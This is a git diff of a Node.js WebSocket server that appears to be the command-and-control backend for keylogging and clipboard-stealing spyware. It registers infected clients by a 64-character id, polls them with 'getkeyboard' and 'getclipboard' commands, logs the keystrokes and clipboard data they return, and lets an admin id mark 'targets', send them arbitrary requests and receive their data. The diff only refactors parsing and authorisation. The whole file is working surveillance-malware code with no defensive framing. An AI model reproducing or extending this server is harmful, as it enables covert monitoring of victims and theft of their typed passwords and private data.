@@ -31,96 +31,106 @@ console.log ('Server is runing');
 webSocketServer.on('connection', connection);
 
 function connection(ws) {
+    console.log('[Info]New client conected');
+
     var lastAnswer = [];
     var isAuthorized = false;
-    console.log('[Info]New client conected');
+    var isJSONParsed = true;
+
+    //If noAuth close connection
     setTimeout(function() {
         if(!isAuthorized){
             ws.close();
         }
     },60000);
+
     ws.on('message', function incoming(message, flags) {
-        if(flags['binary']){console.log(message);}
+        //if(flags['binary']){console.log(message);}
+
         //Try to parse JSON
-        var backUpJSON = lastAnswer;
-        var isParsed = true;
-        try {
-            lastAnswer = JSON.parse(message);
-        }
-        catch (e) {
-            lastAnswer = backUpJSON;
-            console.log('[ERROR]Failed to parse JSON!');
-            ws.close();
-            isParsed = false;
-        }
+        parse_JSON();
+
         //Check id length
         if(lastAnswer['id'] == null){
             console.log('[ERROR]Id = NULL !');
             ws.close();
+            return;
+        }
+        if (lastAnswer['id'].length != 64) {
+            console.log('[ERROR]Incorect id length!');
+            ws.close();
+            return;
+        }
+
+        /*console.log('id = ' + inputArr['id']);
+         console.log(clients[inputArr['id']]);
+         clients[inputArr['id']] = ws;*/
+        if (clients[lastAnswer['id']] == null) {
+            clients[lastAnswer['id']] = ws;
+            ws.send('accepted');
+            console.log('[Info]Client is authorized ' + lastAnswer['id']);
+            isAuthorized = true;
         }
         else {
-            if (lastAnswer['id'].length != 64) {
-                console.log('[ERROR]Incorect id length!');
-                ws.close();
-            }
-            else {
-                /*console.log('id = ' + inputArr['id']);
-                 console.log(clients[inputArr['id']]);
-                 clients[inputArr['id']] = ws;*/
-                if (clients[lastAnswer['id']] == null) {
-                    clients[lastAnswer['id']] = ws;
-                    ws.send('accepted');
-                    console.log('[Info]Client is authorized ' + lastAnswer['id']);
-                    isAuthorized = true;
-                }
-                else {
-                    //Procesing data
-                    if (lastAnswer['ok']) {
-                        if(targets[lastAnswer['id']]) {
-                            if(isParsed) {
-                                try {
-                                    clients[adminID].send(lastAnswer['data']);
-                                }
-                                catch (e) {
-                                    console.log('[WARNING]Admin is disconected error + ' + e + '!');
-                                }
-                            }
-                            else {
-                                clients[adminID].send('[ERROR]Client JSON is not parsed !');
-                            }
+            //Procesing data
+            if (lastAnswer['ok']) {
+                if(targets[lastAnswer['id']]) {
+                    if(isJSONParsed) {
+                        try {
+                            clients[adminID].send(lastAnswer['data']);
                         }
-                        else {
-                            switch (lastAnswer['type']) {
-                                case 'keyboard':
-                                    console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
-                                    getData(lastAnswer['id'], 'getkeyboard');
-                                    break;
-                                case 'clipboard':
-                                    console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
-                                    getData(lastAnswer['id'], 'getclipboard');
-                                    break;
-                                case 'request':
-                                    if (lastAnswer['id'] == adminID) {
-                                        console.log('Request: ' + lastAnswer['data']['request']);
-                                        targets[lastAnswer['data']['targetId']] = true;
-                                        try {
-                                            clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
-                                        }
-                                        catch (e) {
-                                            ws.send('[ERROR]Client is offline now!');
-                                        }
-                                    }
-                                    else {
-                                        console.log('[ERROR]Incorect adminId!');
-                                    }
-                                    break;
-                            }
+                        catch (e) {
+                            console.log('[WARNING]Admin is disconected error + ' + e + '!');
                         }
                     }
                     else {
-                        console.log('[Client ERROR]' + lastAnswer['error']);
+                        clients[adminID].send('[ERROR]Client JSON is not parsed !');
                     }
                 }
+                else {
+                    switch (lastAnswer['type']) {
+                        case 'keyboard':
+                            console.log('Keyboard: ' + lastAnswer['data'][0]['vk']);
+                            getData(lastAnswer['id'], 'getkeyboard');
+                            break;
+                        case 'clipboard':
+                            console.log('Clipboard: ' + lastAnswer['data'][0]['vk']);
+                            getData(lastAnswer['id'], 'getclipboard');
+                            break;
+                        case 'request':
+                            if (lastAnswer['id'] == adminID) {
+                                console.log('Request: ' + lastAnswer['data']['request']);
+                                targets[lastAnswer['data']['targetId']] = true;
+                                try {
+                                    clients[lastAnswer['data']['targetId']].send(lastAnswer['data']['request']);
+                                }
+                                catch (e) {
+                                    ws.send('[ERROR]Client is offline now!');
+                                }
+                            }
+                            else {
+                                console.log('[ERROR]Incorect adminId!');
+                            }
+                            break;
+                    }
+                }
+            }
+            else {
+                console.log('[Client ERROR]' + lastAnswer['error']);
+            }
+        }
+
+
+        function parse_JSON () {
+            var backUpJSON = lastAnswer;
+            try {
+                lastAnswer = JSON.parse(message);
+            }
+            catch (e) {
+                lastAnswer = backUpJSON;
+                console.log('[ERROR]Failed to parse JSON!');
+                ws.close();
+                isJSONParsed = false;
             }
         }
     });
@@ -144,13 +154,12 @@ function connection(ws) {
 function getData (id,type) {
     clients[id].send(type);
 }
-
+/*
 var fs = require('fs');
 
 fs.readFile('clipboard.bin', function (err, data) {
     parse_binary_message(data);
-});
-function parse_binary_message (data) {
+});*/function parse_binary_message (data) {
     if (data.length < 0x0048) {
         console.log('[ERROR]Binary length incorect!');
         return false;
@@ -272,4 +281,3 @@ database.query('SELECT * FROM keyboard', function(err, rows, fields) {
 
     console.log('The solution is: ', rows[0].solution);
 });*/
-
